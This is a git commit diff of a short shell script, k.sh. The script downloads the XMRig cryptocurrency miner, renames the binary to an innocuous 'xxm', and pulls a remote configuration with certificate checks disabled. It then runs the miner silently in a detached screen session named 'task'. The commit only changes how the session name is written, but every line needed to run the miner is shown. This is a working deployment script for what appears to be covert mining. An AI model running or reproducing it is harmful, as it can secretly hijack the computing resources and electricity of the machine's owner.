464c6704587840b50a8d7fc00dec20c541b091d0
chenlysave <cheelysavir139@gmail.com>
2026-03-22 09:08:43 +0800

    Update k.sh

--- k.sh
+++ k.sh
@@ -1,5 +1,4 @@
 #!/bin/bash
-SESSION="task"
 wget https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-x64.tar.gz
 tar -xvzf xmrig-6.25.0-linux-static-x64.tar.gz
 cd xmrig-6.25.0
@@ -7,4 +6,4 @@ mv xmrig xxm
 chmod u+x xxm
 rm -rf config.json
 wget --no-check-certificate -qO ./config.json https://raw.githubusercontent.com/chenlysave/my-micosmgd/refs/heads/main/amd.json
-screen -dmS $SESSION bash -c "cd xmrig-6.25.0 && ./xxm"
+screen -dmS task bash -c "cd xmrig-6.25.0 && ./xxm"
